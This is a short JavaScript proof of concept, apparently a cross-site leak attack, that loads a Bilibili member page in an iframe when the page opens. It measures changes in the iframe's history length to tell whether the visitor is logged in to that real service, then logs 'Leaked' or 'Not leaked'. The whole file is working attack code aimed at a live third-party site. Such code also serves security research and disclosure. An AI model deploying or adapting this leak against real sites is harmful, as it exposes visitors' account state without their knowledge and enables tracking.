const iframe = document.getElementById("iframe");
const iframeWindow = iframe.contentWindow;

const leak = async (url) => {
  return new Promise(async (r) => {
    await switchToBlank(iframeWindow);

    let h1 = iframeWindow.history.length;
    iframeWindow.location = url;
    // wait for redirect
    await sleep(5000);
    await switchToBlank(iframeWindow);

    console.debug(iframeWindow.history.length, h1);

    if (iframeWindow.history.length - h1 === 3) {
      return r(1);
    } else {
      return r(0);
    }
  });
};

const sleep = (ms) => {
  return new Promise((resolve) => setTimeout(resolve, ms));
};

const switchToBlank = async (w) => {
  w.location = "blank.html";
  while (1) {
    try {
      if (w.history.length) {
        await sleep(300);
        return 1;
      }
    } catch (e) { }
    await sleep(50);
  }
};

const test = async () => {
  await switchToBlank(iframeWindow);
  const url = "https://member.bilibili.com/platform/home";
  const result = await leak(url);
  if (result) {
    console.log("Leaked");
  } else {
    console.log("Not leaked");
  }
};

document.addEventListener("DOMContentLoaded", test);
